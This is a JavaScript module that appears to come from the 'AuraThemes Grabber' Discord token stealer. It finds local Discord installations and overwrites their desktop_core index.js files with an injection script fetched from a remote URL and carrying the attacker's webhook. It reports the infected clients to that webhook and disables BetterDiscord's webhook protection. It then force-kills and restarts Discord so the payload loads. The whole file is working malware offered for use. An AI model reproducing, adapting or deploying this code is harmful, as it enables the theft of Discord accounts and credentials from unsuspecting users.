let fs = require("fs"),
  path = require("path"),
  { exec } = require("child_process"),
  { uniqueId } = require("./../../utils/functions/functions"),
  { instance } = require("./../../utils/axios/request"),
  config = require("./../../config/config")(),
  process = require("process");

let local = process.env.localappdata;

let injecPath = [];

let Injection = "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js";

const discordsDirs = () => {
  try {
    return fs.readdirSync(local).filter((f) => f.includes("iscord")).map((f) => path.join(local, f));
  } catch (e) {
    console.error(e);
    return [];
  }
};

const findIndexs = (f) => {
  try {
    fs.readdirSync(f).forEach((d) => {
      let p = path.join(f, d);

      if (fs.statSync(p).isDirectory()) {
        findIndexs(p);
      } else if (d === "index.js" && !f.includes("node_modules") && f.includes("desktop_core")) {
        injecPath.push(p);
      }
    });
  } catch (e) {
    console.error(e);
  }
};

const injection = async (webhook) => {
  try {
    let m = "";
    let r = [];

    injecPath.forEach((k) => {
      const p = k.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i);
      const n = p ? p[1] : "Not Found";
      m += `\`${n}\`, `;
      r.push({ k, n });
    });

    await instance({
      url: webhook[0],
      method: "POST",
      data: {
        username: 'AuraThemes Grabber - Injection',
        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
        embeds: [{
          author: { name: "k4itrun", icon_url: "https://i.imgur.com/WkKXZSl.gif" },
          title: 'Discord(s) injected(s)',
          color: parseInt("#c267ff".replace("#", ""), 16),
          description: m === "" ? "Not Found" : m.slice(0, -2),
          timestamp: new Date(),
          footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
        }]
      }
    });

    let script = await instance.get(Injection);
    let text = script.data.replace("%WEBHOOK%", webhook[0]).replace("%ID_REQUEST%", uniqueId());

    await Promise.all(injecPath.map(async (f) => {
      await fs.promises.writeFile(f, text, { encoding: "utf8", flag: "w" });
    }));
  } catch (e) {
    console.error(e);
  }
};


const bufferReplace = (buf, a, b) => {
  if (!Buffer.isBuffer(buf)) buf = Buffer(buf);
  let idx = buf.indexOf(a);
  if (idx === -1) return buf;
  if (!Buffer.isBuffer(b)) b = Buffer(b);
  let before = buf.slice(0, idx), after = replace(buf.slice(idx + a.length), a, b);
  return Buffer.concat([before, b, after], idx + b.length + after.length);
};

const betterBroke = async () => {
  try {
    let d = path.join(local, "BetterDiscord/data/betterdiscord.asar");
    if (fs.existsSync(d)) {
      await fs.promises.writeFile(d, bufferReplace(await fs.promises.readFile(d), "api/webhooks", "aurathemes"));
    }
  } catch (e) {
    console.error(e);
  }
};

const killApps = async (a) => {
  if (a === false) return;
  try {
    await exec("tasklist", async (e, s, r) => {
      for (let c of [
        "Discord.exe",
        "DiscordCanary.exe",
        "discordDevelopment.exe",
        "DiscordPTB.exe",
      ]) {
        if (s.includes(c)) {
          await exec(`taskkill /F /T /IM ${c}`, (err) => { });
          await exec(`"${local}\\${c.replace(".exe", "")}\\Update.exe" --processStart ${c}`, (err) => {});
        }
      }
    });
  } catch (e) {
    console.error(e);
  }
};

const findInjects = async (f) => {
  try {
    let d = await fs.promises.readdir(f);
    for (let x of d) {
      let p = path.join(f, x), ñ = await fs.promises.stat(p);

      if (ñ.isDirectory()) {
        if (x === "aura") {
          await fs.rmdirSync(p);
        } else {
          await findInjects(p);
        }
      }
    }
  } catch (e) {
    console.error(e);
  }
};

const discordInjected = async (a) => {
  try {
    if (a === false) return;
    let d = discordsDirs();
    
    for (const p of d) {
      findIndexs(p);
    }
    for (const p of d) {
      await findInjects(p);
    }
    await betterBroke();
    await injection(config.webhook);
    await killApps(config.kill.discords);
  } catch (e) {
    console.error(e);
  }
};

module.exports.discordInjected = discordInjected;
